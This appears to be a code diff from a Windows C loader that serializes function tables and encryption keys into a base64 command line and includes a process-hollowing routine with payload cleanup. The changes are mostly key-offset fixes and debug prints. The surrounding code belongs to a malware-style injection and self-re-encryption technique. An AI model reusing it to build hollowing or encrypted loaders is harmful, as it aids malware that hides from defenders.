@@ -219,7 +219,7 @@ void writeSharedMemory(char **commandline) {
     }
 
     // Key address
-    UINT_PTR keyAddress = Rva2Offset((UINT_PTR)getMetaSectionAddress(baseAddress), baseAddress);
+    UINT_PTR keyAddress = Rva2Offset((UINT_PTR)getMetaSectionAddress(baseAddress), baseAddress) + getMetaSectionPhysicalSize(baseAddress) - sizeof(nextEncryptionKey);
 
     ProcessData data = {0};
     strncpy(data.executablePath, executablePath, sizeof(executablePath));
@@ -228,14 +228,7 @@ void writeSharedMemory(char **commandline) {
     data.recryptionKey = recryptionKey;
     data.nextEncryptionKey = nextEncryptionKey;
     data.keyAddress = keyAddress;
-    /*
-    typedef struct {
-        ULONGLONG virtualAddress; // RVA offset
-        ULONGLONG physicalAddress; // File offset
-        ULONGLONG size; // Size of the function in memory (it might error on disk... i'll take my chances for now)
-        char name[64];        // Name of the function
-    } FunctionInfo;
-    */
+
     printf("Executable Path: %s\n", executablePath);
     printf("Number of Functions: %zu\n", numFunctions);
     for (size_t i = 0; i < numFunctions; ++i) {
@@ -301,16 +294,26 @@ void writeSharedMemory(char **commandline) {
     // Serialize keyAddress
     memcpy(ptr, &keyAddress, sizeof(keyAddress));
     ptr += sizeof(keyAddress);
+    printf("Key Address from Loader: 0x%llX\n", keyAddress);
 
+    /*
     // Base64 encode the serialized data
+    void* b64_encoded = b64_encode((const unsigned char *)buffer, total_size);
+
+    //combine exe path and b64encoded string
+    const char *commandlinePath = "D:\\VMs\\SharedDrive\\loader_engine_stripped.exe";
+    printf("=======Made it so far=======\n");
+    *commandline = (char *)malloc(b64_encoded_size(total_size) + strlen(commandlinePath) + 3); // + 2 for space and null terminator + 1 for b64 internal value
+    snprintf(*commandline, b64_encoded_size(total_size) + strlen(commandlinePath) + 3, "%s %s", commandlinePath, (const char *)b64_encoded);
+    free(b64_encoded);
+    */
     *commandline = b64_encode((const unsigned char *)buffer, total_size);
+    free(buffer);
     if (*commandline) {
         printf("Base64 encoded data: %s\n", *commandline);
     } else {
         fprintf(stderr, "Failed to base64 encode the data\n");
     }
-
-    free(buffer);
 }
 
 IMAGE_NT_HEADERS* get_nt_hdrs(BYTE *pe_buffer)
@@ -580,7 +583,9 @@ void hollowing() {
 
     // 9. Cleanup local memory
     free(file);
+    printf("Free File\n");
     VirtualFree(localPayloadCopy, payloadNtHeader->OptionalHeader.SizeOfImage, MEM_FREE);
+    printf("Free local payload copy\n");
 
 
 
